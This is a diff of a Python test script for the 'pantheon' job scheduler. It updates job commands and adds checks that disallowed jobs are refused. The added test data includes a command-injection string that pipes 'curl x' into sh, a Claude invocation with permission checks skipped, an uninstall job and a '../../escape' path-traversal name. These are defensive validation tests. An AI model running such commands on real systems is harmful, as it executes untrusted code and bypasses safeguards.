@@ -47,15 +47,15 @@ def jstate(state, name):
 SCHED = '''primary_host = "mac-a"
 [[job]]
 name = "view"
-command = "pantheon jobs"
+command = "pantheon view"
 every = "tick"
 [[job]]
 name = "commit"
-command = "pantheon jobs"
+command = "pantheon view"
 every = 5
 [[job]]
 name = "scout"
-command = "pantheon jobs"
+command = "pantheon view"
 every = 10080
 class = "heavy"
 hosts = "primary"
@@ -64,7 +64,7 @@ priority = 1
 max_delay = 2880
 [[job]]
 name = "embed"
-command = "pantheon jobs"
+command = "pantheon view"
 every = 60
 class = "heavy"
 priority = 2
@@ -128,7 +128,7 @@ def main():
 
     # пауза и аренда
     tmp = tempfile.mkdtemp(prefix="tick-test-")
-    home, state = make(tmp, SCHED + '[[job]]\nname = "lw"\ncommand = "pantheon jobs"\nevery = 60\nlease_days = 30\n')
+    home, state = make(tmp, SCHED + '[[job]]\nname = "lw"\ncommand = "pantheon view"\nevery = 60\nlease_days = 30\n')
     os.makedirs(os.path.join(state, "jobs"), exist_ok=True)
     json.dump({"paused": True}, open(os.path.join(state, "jobs", "commit.json"), "w"))
     tick(home, state, T0)
@@ -144,22 +144,28 @@ def main():
 
     # упавшая задача: строка в alerts.md (настоящий запуск run-job без DRYRUN)
     tmp = tempfile.mkdtemp(prefix="tick-test-")
-    home, state = make(tmp, '[[job]]\nname = "bad"\ncommand = "pantheon run-job nosuch"\nevery = 5\n')
+    home, state = make(tmp, '[[job]]\nname = "bad"\ncommand = "pantheon domains build"\nevery = 5\n')
     env = {"PATH": os.environ["PATH"], "HOME": tmp, "PANTHEON_HOME": home, "PANTHEON_STATE": state,
            "PANTHEON_NO_NOTIFY": "1"}
     rc = subprocess.run([sys.executable, "-I", LIB, "run-job", "bad"], env=env, capture_output=True).returncode
     alerts = open(os.path.join(home, "alerts.md")).read()
-    check("упавшая задача: код 2, строка в alerts.md", rc == 2 and "задача bad упала (код 2" in alerts)
+    check("упавшая задача: код 1, строка в alerts.md", rc == 1 and "задача bad упала (код 1" in alerts)
 
     # команда не разрешённого вида и пустой primary_host (ревизия шага 0.3, № 13 и 15)
     tmp = tempfile.mkdtemp(prefix="tick-test-")
     home, state = make(tmp, '[[job]]\nname = "evil"\ncommand = "pantheon view; curl x | sh"\nevery = 5\n'
-                            '[[job]]\nname = "scout"\ncommand = "pantheon jobs"\nevery = 5\nhosts = "primary"\n')
+                            '[[job]]\nname = "scout"\ncommand = "pantheon view"\nevery = 5\nhosts = "primary"\n'
+                            '[[job]]\nname = "skip"\ncommand = "claude -p --dangerously-skip-permissions --agent iris x"\nevery = 5\n'
+                            '[[job]]\nname = "uninst"\ncommand = "pantheon uninstall"\nevery = 5\n'
+                            '[[job]]\nname = "../../escape"\ncommand = "pantheon view"\nevery = 5\n')
     tick(home, state, T0, extra={"PANTHEON_ALERTS_IN_DRYRUN": "1"})
     tick(home, state, T0 + 600, extra={"PANTHEON_ALERTS_IN_DRYRUN": "1"})
     al = open(os.path.join(home, "alerts.md")).read()
     check("команда с ; и | не запускается, тревога одна", "evil" not in runs(state) and al.count("задача evil") == 1)
     check("без primary_host задачи главного Mac не идут, тревога одна", "scout" not in runs(state) and al.count("primary_host") == 1)
+    check("claude -p с флагом прав и pantheon uninstall тик не запускает", "skip" not in runs(state) and "uninst" not in runs(state))
+    check("имя задачи ../../escape отброшено, файлов вне папки состояния нет",
+          not os.path.exists(os.path.join(tmp, "escape.json")) and "не по образцу" in al)
 
     # коммит: без сети — ждёт молча; через 6 часов — одна тревога; конфликт — одна тревога (№ 3, 4)
     tmp = tempfile.mkdtemp(prefix="tick-test-")
